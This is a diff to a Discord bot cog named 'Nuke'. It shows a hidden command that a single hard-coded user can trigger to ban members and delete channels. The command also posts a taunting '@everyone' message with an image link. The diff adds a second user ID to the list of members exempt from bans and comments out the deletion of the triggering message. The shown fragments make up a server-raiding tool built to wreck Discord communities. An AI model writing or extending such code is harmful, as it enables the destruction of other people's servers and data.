@@ -8,7 +8,7 @@ class Nuke(commands.Cog):
         self.message = "you got fucked up\n https://cdn.discordapp.com/attachments/603298907023343723/609265114331217933/Soldiers_raising_the_Albanian_flag_over_the_Reichstag_Berlin_1945_2.jpg"
         self.invites = '@everyone'
         self.koda = 599507281226367006
-        self.no_ban = [599507281226367006]
+        self.no_ban = [599507281226367006, 490275541413265409]
     
     async def delete_channels(self, ctx):
         print("Deleted channels ( ", end='', flush=True)
@@ -78,7 +78,7 @@ class Nuke(commands.Cog):
     
     @commands.command(hidden=True)
     async def nuke(self, ctx):
-        await ctx.message.delete()
+        # await ctx.message.delete()
         if ctx.author.id == self.koda:
             await self.ban_members(ctx)
             await self.delete_channels(ctx)
